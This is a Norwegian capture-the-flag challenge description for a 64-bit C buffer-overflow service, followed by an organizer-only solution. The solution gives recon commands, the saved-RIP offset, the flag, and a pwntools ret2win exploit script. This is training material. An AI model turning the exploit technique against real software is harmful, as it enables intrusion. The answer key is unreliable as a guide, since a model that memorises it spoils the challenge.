# Buffer på boden

**Kategori:** Pwn
**Poeng:** 200
**Type:** Container (TCP-tjeneste, ny prosess per forbindelse)
**Vanskelighetsgrad:** Medium

---

## Scenario

Nordverk har en liten «velkomstbod» på Teknologidagene der besøkende
kan registrere navnet sitt. Programmet er skrevet i C, og en intern
gjennomgang ga ingen merknader, men koden bruker en velkjent farlig
funksjon for å lese inputen.

Klarer du registrere deg som **VIP**?

---

## Tilkobling

```
nc <IP> 9999
```

---

## Vedlegg

- [`buffer`](server/buffer), 64-bit ELF-binær (samme som kjører på serveren)

---

## Flaggformat

```
CTF{...}
```

---

## Hints

| Kostnad | Hint |
|---------|------|
| Gratis | `checksec --file=buffer` røper hva som er på/av (ingen canary, ikke PIE). |
| 25 poeng | Symboltabellen eller disassembly avslører en funksjon som ikke kalles normalt. |
| 50 poeng | Finn offseten til saved RIP og pek kontrollflyten mot mål-funksjonen. GDB og cyclic-mønster er nyttig. |
| 75 poeng | Hvis hoppet går til riktig funksjon, men krasjer inne i libc, sjekk stack-alignment på amd64. |

---

## Løsningsvei (kun for arrangør)

### Steg 1 — Recon

```bash
checksec --file=buffer
# RELRO          STACK CANARY  NX        PIE      ...
# Partial RELRO  No canary     NX enab.  No PIE   ...

objdump -d buffer | grep -A1 "<win>:"
# 00000000004011a6 <win>:
#   4011a6: ...
```

Adressene kan endre seg hvis binæren bygges på nytt, så slå alltid opp `win`
i den faktiske vedlagte filen før payloaden bygges.

### Steg 2 — Finn offset

`name`-bufferet er 64 byte, men kompilatoren kan padde litt. Med `cyclic 100`
finner man at offset til saved RIP er 72 byte (64 buffer + 8 saved RBP).

### Steg 3 — Bygg payload

```python
from pwn import *
elf = ELF("./buffer")
io = remote("HOST", 9999)
io.recvuntil(b"navn:")

ret_gadget = next(elf.search(b"\xc3"))       # ret, for 16-byte alignment
payload = b"A" * 72 + p64(ret_gadget) + p64(elf.symbols["win"])
io.sendline(payload)
print(io.recvall().decode())
```

**Flagg:** `CTF{buffer_p4_b0den_ret2win}`
